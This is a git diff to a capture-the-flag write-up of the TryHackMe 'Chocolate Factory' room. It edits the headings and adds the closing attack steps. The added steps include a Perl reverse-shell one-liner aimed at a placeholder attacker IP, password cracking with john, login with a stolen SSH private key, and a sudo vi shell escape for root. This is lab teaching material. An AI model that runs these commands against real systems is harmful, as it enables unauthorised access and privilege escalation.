@@ -2,9 +2,7 @@
 
 This is the writeup for the box Chocolate Factory
 
-## 🔍 Enumeration Phase
-
-### 1. WebSite
+## 🌐🖥️ 1. WebSite
 - The website.
 - No useful information was found in `robots.txt`.
   
@@ -12,7 +10,7 @@ This is the writeup for the box Chocolate Factory
 
   ![Robots.txt](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/01.png)
 
-### 2. Fuzzing
+## 🧪🔍⚙️ 2. Fuzzing
 -  **Dirbuster / Gobuster** was used to find directories and files but no useful information was found.
   
     ![Fuzzing](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/02.png)
@@ -74,7 +72,7 @@ This is the writeup for the box Chocolate Factory
 
 ## 🕵️‍♂️🖼️ 7. Steganography
 
-- I used different tools to check if the image had hidden information 
+- I used different tools to check if the image has hidden information 
 
   ![stegonography](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/14.png)
 
@@ -97,3 +95,59 @@ This is the writeup for the box Chocolate Factory
   ```john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt```
 
   ![password-cracked](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/18.png)
+
+## 🌐🖥️ 9. WebSite again - Reverse Shell
+
+- I can access to the website with the credentials obtained from the previous phase.
+
+- The website has a input where we can execute commands
+
+  ![input](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/19.png)
+
+- I am going to use a reverse shell to get a shell on the machine
+
+  ![reverse-shell](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/20.png)
+
+- I used the following command to get a reverse shell:
+
+  ```perl -e 'use Socket;$i="TU_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'```
+
+  ![reverse-shell-2](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/21.png)
+
+## 🐚💻🚀 10 Reverse Shell - Privilege Escalation
+
+- I moved to the home directory for the user ```charlie``` and I found various files but the file ```user.txt``` is with a permission denied (I am the user ```www-data```).
+
+  ![user.txt](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/22.png)
+
+- But we can escalate privileges using the private SSH key.
+
+  ![private-ssh-key](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/23.png)
+
+  ![public-ssh-key](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/24.png)
+
+- I copied the private SSH key to my user's ```.ssh``` directory and I used the following command to connect to the machine:
+
+  ```ssh -i ~/.ssh/charlie_id_rsa charlie@ip-machine```
+
+  ![ssh-connection](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/25.png)
+
+- If I now try to see the contents of the file ```user.txt``` I get the flag : 
+
+  ![user.txt-2](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/26.png)
+
+- Now, I have used the command ```sudo -l```to check the privileges of the user ```charlie```:
+
+  ![sudo-l](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/27.png)
+
+- After searching GTFOBins to find if there is any specific command for that program to escalate privileges : ``` sudo vi -c ':!/bin/sh' /dev/null ```
+
+  ![sudo-vi](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/28.png)
+
+> [!NOTE]
+> The website used to identify if exists a command to escalate privileges has been:
+> https://gtfobins.github.io/gtfobins/vi/#sudo
+
+- We need to navigate to the root folder. There, we see a file named root.py which, when executed, asks for a password (the first flag). If we enter it correctly, it gives us the final flag.
+
+  ![root.py](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/chocolate-factory/screenshots/29.png)
